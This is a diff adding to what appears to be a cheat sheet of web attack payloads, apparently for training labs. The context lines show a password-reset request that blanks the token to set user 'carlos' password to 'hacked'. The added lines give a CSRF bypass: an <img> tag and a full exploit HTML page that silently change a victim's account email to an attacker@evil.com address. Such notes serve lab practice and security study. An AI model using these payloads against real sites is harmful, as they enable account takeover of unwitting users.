@@ -100,3 +100,17 @@ Transfer-Encoding: chunked
 POST /forgot-password?temp-forgot-password-token=
 temp-forgot-password-token=&username=carlos&new-password-1=hacked&new-password-2=hacked
 ```
+
+### CSRF
+```
+# CSRF token only validated on POST, not GET
+# Bypass: use <img> tag to trigger GET request
+<img src="https://target.com/my-account/change-email?email=attacker@evil.com">
+
+# Exploit HTML:
+<html>
+<body>
+<img src="https://TARGET/my-account/change-email?email=test@evil.com">
+</body>
+</html>
+```
